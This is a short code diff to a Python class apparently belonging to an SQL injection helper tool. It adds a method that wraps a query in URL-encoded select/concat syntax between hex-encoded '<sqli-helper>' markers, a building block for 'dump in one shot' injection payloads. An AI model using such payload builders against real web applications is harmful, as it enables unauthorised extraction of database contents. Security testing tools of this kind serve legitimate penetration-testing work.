@@ -7,8 +7,8 @@ class Dios:
     startSQLi = "0x3C73716C692D68656C7065723E" # <sqli-helper>
     endSQLi = "0x3C2F73716C692D68656C7065723E" # </sqli-helper>
 
-
-
+    def build(self, query):
+        return f"(select+concat({self.startSQLi},(select+concat({query})),{self.endSQLi}))"
 
     def get_information(self,level=1):
         if level == 1:
